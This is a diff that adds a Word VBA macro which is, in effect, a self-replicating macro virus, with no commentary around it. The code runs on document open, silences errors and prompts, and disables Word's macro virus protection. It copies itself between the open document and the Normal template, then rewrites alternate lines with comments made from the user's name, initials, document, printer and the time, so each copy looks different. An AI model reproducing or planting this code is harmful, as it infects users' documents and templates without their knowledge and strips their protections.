@@ -1,0 +1,27 @@
+Sub Document_Open()
+On Error Resume Next
+Options.SaveNormalPrompt = 0
+Application.EnableCancelKey = 0
+RC24 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
+Options.ConfirmConversions = 0
+Options.VirusProtection = 0
+CO49 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
+If CO49 > 0 And RC24 > 0 Then GoTo JO36
+If CO49 = 0 Then
+Set KT74 = ActiveDocument.VBProject.VBComponents.Item(1)
+IH6 = True
+End If
+If RC24 = 0 Then
+Set KT74 = NormalTemplate.VBProject.VBComponents.Item(1)
+FV52 = True
+End If
+If FV52 <> True And IH6 <> True Then GoTo JO36
+If FV52 = True Then KT74.CodeModule.AddFromString ("Sub Document_Close()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, CO49 - 1))
+If IH6 = True Then KT74.CodeModule.AddFromString ("Sub Document_Open()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, RC24 - 1))
+With KT74.CodeModule
+For x = 2 To (KT74.CodeModule.CountOfLines - 1) Step 2
+.replaceline x, "'" & Application.UserName & Application.UserInitials & Application.ActiveWindow & Application.ActiveDocument & Application.ActivePrinter & Now
+Next x
+End With
+JO36:
+End Sub
